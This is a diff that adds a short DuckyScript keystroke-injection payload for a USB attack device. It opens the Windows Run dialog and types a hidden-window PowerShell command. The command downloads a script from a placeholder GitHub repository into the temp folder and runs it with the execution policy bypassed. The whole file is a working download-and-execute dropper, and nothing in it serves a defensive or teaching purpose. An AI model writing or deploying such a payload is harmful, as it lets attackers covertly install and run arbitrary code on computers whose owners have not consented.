@@ -1,0 +1,5 @@
+DELAY 5000
+GUI r
+DELAY 500
+STRING powershell -windowstyle hidden -Command "Start-Sleep -s 10; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SEU_USUARIO/SEU_REPOSITORIO/master/script.ps1' -OutFile '$env:temp\script.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File $env:temp\script.ps1'"
+ENTER
